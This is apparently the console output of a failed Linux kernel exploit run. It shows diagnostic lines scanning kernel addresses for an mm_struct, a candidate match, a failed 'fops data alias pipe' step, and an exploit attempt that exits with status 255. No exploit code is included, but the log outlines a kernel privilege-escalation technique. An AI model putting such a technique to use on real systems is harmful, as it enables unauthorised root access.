+[33m[*] [0mDIAG[171] cand=ffffff8080006540 h0=11 b0=11 h1=4 b1=4 h2=11 h3=85 nmatch=1
+[33m[*] [0mDIAG[172] cand=ffffff8080006900 h0=6 b0=6 h1=8 b1=8 h2=116 h3=96 nmatch=0
+[33m[*] [0mDIAG[173] cand=ffffff8080006cc0 h0=85 b0=85 h1=12 b1=12 h2=93 h3=22 nmatch=0
+[33m[*] [0mDIAG[174] cand=ffffff8080007080 h0=95 b0=95 h1=109 b1=109 h2=64 h3=20 nmatch=0
+[33m[*] [0mDIAG[175] cand=ffffff8080007440 h0=24 b0=24 h1=95 b1=95 h2=21 h3=111 nmatch=0
+[33m[*] [0mDIAG[176] cand=ffffff8080007800 h0=30 b0=30 h1=24 b1=24 h2=31 h3=64 nmatch=0
+[33m[*] [0mDIAG[177] cand=ffffff8080007bc0 h0=24 b0=24 h1=82 b1=82 h2=10 h3=124 nmatch=0
+[33m[*] [0mDIAG[178] cand=ffffff8080007f80 h0=37 b0=37 h1=75 b1=75 h2=111 h3=15 nmatch=0
+[33m[*] [0mDIAG[179] cand=ffffff8080008000 h0=37 b0=37 h1=104 b1=104 h2=109 h3=94 nmatch=0
+[33m[*] [0mDIAG[180] cand=ffffff80800083c0 h0=113 b0=113 h1=61 b1=61 h2=85 h3=71 nmatch=0
+[33m[*] [0mDIAG[181] cand=ffffff8080008780 h0=42 b0=42 h1=65 b1=65 h2=68 h3=8 nmatch=0
+[33m[*] [0mDIAG[182] cand=ffffff8080008b40 h0=69 b0=69 h1=69 b1=69 h2=47 h3=26 nmatch=1
+[33m[*] [0mDIAG[183] cand=ffffff8080008f00 h0=95 b0=95 h1=121 b1=121 h2=80 h3=127 nmatch=1
+[33m[*] [0mDIAG[184] cand=ffffff80800092c0 h0=117 b0=117 h1=100 b1=100 h2=109 h3=26 nmatch=0
+[33m[*] [0mDIAG[185] cand=ffffff8080009680 h0=31 b0=31 h1=95 b1=95 h2=36 h3=98 nmatch=0
+[33m[*] [0mDIAG[186] cand=ffffff8080009a40 h0=23 b0=23 h1=88 b1=88 h2=69 h3=61 nmatch=0
+[33m[*] [0mDIAG[187] cand=ffffff8080009e00 h0=104 b0=104 h1=59 b1=59 h2=17 h3=87 nmatch=0
+[33m[*] [0mDIAG[188] cand=ffffff808000a1c0 h0=84 b0=84 h1=103 b1=103 h2=79 h3=84 nmatch=1
+[33m[*] [0mDIAG[189] cand=ffffff808000a580 h0=20 b0=20 h1=118 b1=118 h2=110 h3=22 nmatch=0
+[33m[*] [0mDIAG[190] cand=ffffff808000a940 h0=41 b0=41 h1=87 b1=87 h2=41 h3=72 nmatch=1
+[33m[*] [0mDIAG[191] cand=ffffff808000ad00 h0=20 b0=20 h1=12 b1=12 h2=122 h3=58 nmatch=0
+[33m[*] [0mDIAG[192] cand=ffffff808000b0c0 h0=6 b0=6 h1=75 b1=75 h2=98 h3=18 nmatch=1
+[33m[*] [0mDIAG[193] cand=ffffff808000b480 h0=81 b0=81 h1=96 b1=96 h2=110 h3=68 nmatch=0
+[33m[*] [0mDIAG[194] cand=ffffff808000b840 h0=75 b0=75 h1=107 b1=107 h2=34 h3=95 nmatch=0
+[33m[*] [0mDIAG[195] cand=ffffff808000bc00 h0=123 b0=123 h1=84 b1=84 h2=72 h3=47 nmatch=0
+[33m[*] [0mDIAG[196] cand=ffffff808000bfc0 h0=37 b0=37 h1=92 b1=92 h2=11 h3=22 nmatch=0
+[33m[*] [0mDIAG[197] cand=ffffff808000c380 h0=27 b0=27 h1=116 b1=116 h2=85 h3=49 nmatch=0
+[33m[*] [0mDIAG[198] cand=ffffff808000c740 h0=86 b0=86 h1=2 b1=2 h2=83 h3=105 nmatch=0
+[33m[*] [0mDIAG[199] cand=ffffff808000cb00 h0=82 b0=82 h1=7 b1=7 h2=65 h3=121 nmatch=0
+[33m[*] [0mDIAG[92] cand=ffffff8000015280 h0=42 b0=42 h1=90 b1=90 h2=25 h3=89 nmatch=0
+[33m[*] [0m[  6] start finding mm_struct [ffffff8140000000-ffffff81c0000000]
+[33m[*] [0mDIAG[142] cand=ffffff80c000a940 h0=62 b0=62 h1=4 b1=4 h2=108 h3=96 nmatch=0
+[33m[*] [0m[  5] start finding mm_struct [ffffff8100000000-ffffff8180000000]
+[33m[*] [0mDIAG[144] cand=ffffff8180000780 h0=0 b0=0 h1=41 b1=41 h2=71 h3=45 nmatch=0
+[33m[*] [0mDIAG[96] cand=ffffff8000000f00 h0=24 b0=24 h1=99 b1=99 h2=120 h3=125 nmatch=0
+[33m[*] [0mDIAG[96] cand=ffffff8040000000 h0=69 b0=69 h1=27 b1=27 h2=29 h3=56 nmatch=0
+[33m[*] [0mMATCH cand=ffffff81f1f1d640 nmatch=4/7 need=4 match_total=1
+[33m[*] [0mdone
+[31m[!] [0mfops data alias pipe preparation failed candidate=with-slide
+[31m[-] [0mexploit attempt=1/1 failed status=255
+[31m[!] [0mexploit failed after 1 independent attempts
+[runner-live] child=20572 complete status=0xff00
